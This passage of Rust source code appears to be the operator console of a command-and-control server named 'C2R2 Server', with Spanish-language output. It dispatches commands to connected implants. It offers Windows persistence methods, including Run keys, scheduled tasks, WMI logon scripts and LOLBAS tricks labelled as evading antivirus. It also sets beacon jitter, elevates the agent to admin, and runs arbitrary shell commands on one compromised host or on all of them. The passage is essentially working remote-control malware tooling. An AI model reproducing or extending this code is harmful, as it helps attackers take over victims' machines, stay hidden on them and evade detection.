                                println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                                *selected_client.lock().unwrap() = None;
                            }
                        } else {
                            println!(
                                "{}",
                                "❌ No hay cliente seleccionado. Usa /select <id>".bright_red()
                            );
                        }
                    }
                    "/persist" => {
                        if parts.len() < 2 {
                            println!("{} /persist <method>", "❌ Uso:".bright_red());
                            println!("   Métodos tradicionales:");
                            println!("     registry  - Clave Run en HKCU (recomendado)");
                            println!("     task      - Tarea programada ONLOGON");
                            println!("     wmi       - UserInitMprLogonScript (muy sigiloso)");
                            println!("     startup   - Acceso directo en Startup folder");
                            println!("   Métodos LOLBAS (Living Off the Land):");
                            println!("     mshta     - forfiles.exe (evade AV)");
                            println!("     regsvr32  - Run key con wrapper cmd");
                            println!("     rundll    - url.dll FileProtocolHandler");
                            println!("     certutil  - Tarea programada con delay");
                            continue;
                        }

                        let method = &parts[1];
                        let selected = *selected_client.lock().unwrap();

                        if let Some(id) = selected {
                            let clients = clients.lock().unwrap();

                            if let Some(client) = clients.get(&id) {
                                info!("[{}] Comando /persist: método {}", id, method);

                                println!();
                                println!(
                                    "{}",
                                    "╔═══════════════════════════════════════════════════════════╗"
                                        .bright_magenta()
                                );
                                println!(
                                    "{}",
                                    format!("║        📌 ESTABLECIENDO PERSISTENCIA [{}]", id)
                                        .bright_magenta()
                                        .bold()
                                );
                                println!(
                                    "{}",
                                    "╚═══════════════════════════════════════════════════════════╝"
                                        .bright_magenta()
                                );
                                println!();
                                println!("{}", format!("  🎯 Método: {}", method).bright_yellow());
                                println!(
                                    "{}",
                                    "  ⏳ Esperando confirmación...".bright_white().dimmed()
                                );
                                println!();

                                let persist_cmd = format!("__PERSIST__:{}", method);
                                if let Err(e) = client.tx.send(persist_cmd) {
                                    error!("[{}] Error enviando comando __PERSIST__: {}", id, e);
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                }
                            } else {
                                println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                                *selected_client.lock().unwrap() = None;
                            }
                        } else {
                            println!(
                                "{}",
                                "❌ No hay cliente seleccionado. Usa /select <id>".bright_red()
                            );
                        }
                    }
                    "/persist_remove" => {
                        let selected = *selected_client.lock().unwrap();

                        if let Some(id) = selected {
                            let clients = clients.lock().unwrap();

                            if let Some(client) = clients.get(&id) {
                                info!("[{}] Comando /persist_remove: Removiendo persistencia", id);

                                println!();
                                println!(
                                    "{}",
                                    "╔═══════════════════════════════════════════════════════════╗"
                                        .bright_yellow()
                                );
                                println!(
                                    "{}",
                                    format!("║          🧹 REMOVIENDO PERSISTENCIA [{}]", id)
                                        .bright_yellow()
                                        .bold()
                                );
                                println!(
                                    "{}",
                                    "╚═══════════════════════════════════════════════════════════╝"
                                        .bright_yellow()
                                );
                                println!();
                                println!("{}", "  ⏳ Limpiando...".bright_white().dimmed());
                                println!();

                                if let Err(e) = client.tx.send("__PERSIST_REMOVE__".to_string()) {
                                    error!(
                                        "[{}] Error enviando comando __PERSIST_REMOVE__: {}",
                                        id, e
                                    );
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                }
                            } else {
                                println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                                *selected_client.lock().unwrap() = None;
                            }
                        } else {
                            println!(
                                "{}",
                                "❌ No hay cliente seleccionado. Usa /select <id>".bright_red()
                            );
                        }
                    }
                    "/beacon" => {
                        if parts.len() < 2 {
                            println!("{} /beacon <interval:jitter>", "❌ Uso:".bright_red());
                            println!("   Ejemplo: /beacon 60:30  (60 segundos con ±30% jitter)");
                            continue;
                        }

                        let config = &parts[1];
                        let selected = *selected_client.lock().unwrap();

                        if let Some(id) = selected {
                            let clients = clients.lock().unwrap();

                            if let Some(client) = clients.get(&id) {
                                info!("[{}] Comando /beacon: configuración {}", id, config);

                                println!();
                                println!(
                                    "{}",
                                    "╔═══════════════════════════════════════════════════════════╗"
                                        .bright_blue()
                                );
                                println!(
                                    "{}",
                                    format!("║        📡 CONFIGURANDO BEACON [{}]", id)
                                        .bright_blue()
                                        .bold()
                                );
                                println!(
                                    "{}",
                                    "╚═══════════════════════════════════════════════════════════╝"
                                        .bright_blue()
                                );
                                println!();
                                println!("{}", format!("  🎯 Config: {}", config).bright_yellow());
                                println!(
                                    "{}",
                                    "  ℹ️  Se aplicará en la próxima reconexión"
                                        .bright_white()
                                        .dimmed()
                                );
                                println!();

                                let beacon_cmd = format!("__BEACON__:{}", config);
                                if let Err(e) = client.tx.send(beacon_cmd) {
                                    error!("[{}] Error enviando comando __BEACON__: {}", id, e);
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                }
                            } else {
                                println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                                *selected_client.lock().unwrap() = None;
                            }
                        } else {
                            println!(
                                "{}",
                                "❌ No hay cliente seleccionado. Usa /select <id>".bright_red()
                            );
                        }
                    }
                    "/elevate" => {
                        let selected = *selected_client.lock().unwrap();

                        if let Some(id) = selected {
                            let clients = clients.lock().unwrap();

                            if let Some(client) = clients.get(&id) {
                                info!("[{}] Comando /elevate: Re-ejecutando agente con privilegios admin", id);

                                println!();
                                println!(
                                    "{}",
                                    "╔═══════════════════════════════════════════════════════════╗"
                                        .bright_red()
                                );
                                println!(
                                    "{}",
                                    format!("║      ⬆️  ELEVANDO AGENTE A ADMIN [{}]", id)
                                        .bright_red()
                                        .bold()
                                );
                                println!(
                                    "{}",
                                    "╚═══════════════════════════════════════════════════════════╝"
                                        .bright_red()
                                );
                                println!();
                                println!(
                                    "{}",
                                    "  🎯 Re-ejecutando agente con privilegios elevados..."
                                        .bright_yellow()
                                );
                                println!(
                                    "{}",
                                    "  ⚠️  Se mostrará UAC prompt al usuario"
                                        .bright_white()
                                        .dimmed()
                                );
                                println!("{}", "  🔄 El agente actual se desconectará y el elevado se reconectará".bright_white().dimmed());
                                println!();

                                let elevate_cmd = "__ELEVATE__".to_string();
                                if let Err(e) = client.tx.send(elevate_cmd) {
                                    error!("[{}] Error enviando comando __ELEVATE__: {}", id, e);
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                }
                            } else {
                                println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                                *selected_client.lock().unwrap() = None;
                            }
                        } else {
                            println!(
                                "{}",
                                "❌ No hay cliente seleccionado. Usa /select <id>".bright_red()
                            );
                        }
                    }
                    "/cmd" => {
                        if parts.len() < 2 {
                            println!("{} /cmd <comando>", "❌ Uso:".bright_red());
                            continue;
                        }

                        let command = reconstruct_command(&parts[1..]);
                        let selected = *selected_client.lock().unwrap();

                        if let Some(id) = selected {
                            let clients = clients.lock().unwrap();

                            if let Some(client) = clients.get(&id) {
                                if let Err(e) = client.tx.send(command.clone()) {
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                } else {
                                    println!(
                                        "{} {} → {}",
                                        "📤".bright_blue(),
                                        format!("[{}]", id).bright_cyan().bold(),
                                        command.bright_white()
                                    );
                                }
                            } else {
                                println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                                *selected_client.lock().unwrap() = None;
                            }
                        } else {
                            println!(
                                "{}",
                                "❌ No hay cliente seleccionado. Usa /select <id>".bright_red()
                            );
                        }
                    }
                    "/cmd_all" => {
                        if parts.len() < 2 {
                            println!("{} /cmd_all <comando>", "❌ Uso:".bright_red());
                            continue;
                        }

                        let command = reconstruct_command(&parts[1..]);
                        let clients = clients.lock().unwrap();

                        info!(
                            "Comando /cmd_all: {} (a {} clientes)",
                            command,
                            clients.len()
                        );

                        if clients.is_empty() {
                            println!("{}", "❌ No hay clientes conectados".bright_red());
                        } else {
                            let mut count = 0;
                            for (id, client) in clients.iter() {
                                if client.tx.send(command.clone()).is_ok() {
                                    println!(
                                        "{} {} → {}",
                                        "�".bright_magenta(),
                                        format!("[{}]", id).bright_cyan().bold(),
                                        command.bright_white().dimmed()
                                    );
                                    count += 1;
                                }
                            }
                            println!(
                                "{} Enviado a {} cliente(s)",
                                "✅".bright_green(),
                                count.to_string().bright_cyan().bold()
                            );
                        }
                    }
                    "/exit" | "/quit" => {
                        println!();
                        println!("{}", "👋 Cerrando C2R2 Server...".bright_yellow().bold());
                        println!();
                        info!("═══════════════════════════════════════════════════════════");
                        info!("Server cerrado por comando /exit del operador");
                        info!("═══════════════════════════════════════════════════════════");
                        // Guardar historial antes de salir
                        let _ = rl.save_history(history_file);
                        std::process::exit(0);
                    }
                    _ => {
                        println!(
                            "{} Comando '{}' desconocido. Usa {}",
                            "❌".bright_red(),
                            parts[0].bright_yellow(),
                            "/help".bright_cyan()
                        );
                    }
                }
            }
            Err(ReadlineError::Interrupted) => {
                // Ctrl+C presionado
                println!();
                println!(
                    "{}",
                    "👋 Cerrando C2R2 Server... (Ctrl+C)".bright_yellow().bold()
                );
                info!("═══════════════════════════════════════════════════════════");
                info!("Server cerrado por Ctrl+C del operador");
                info!("═══════════════════════════════════════════════════════════");
                let _ = rl.save_history(history_file);
                std::process::exit(0);
            }
            Err(ReadlineError::Eof) => {
                // Ctrl+D presionado
                println!();
                println!(
                    "{}",
                    "👋 Cerrando C2R2 Server... (Ctrl+D)".bright_yellow().bold()
                );
                info!("═══════════════════════════════════════════════════════════");
                info!("Server cerrado por Ctrl+D del operador");
                info!("═══════════════════════════════════════════════════════════");
                let _ = rl.save_history(history_file);
                std::process::exit(0);
            }
            Err(err) => {
                eprintln!("{} Error: {:?}", "❌".bright_red(), err);
                break;
            }
        }
    }

    // Mantener guard vivo hasta el final (necesario para flush de logs)
    drop(guard);
}
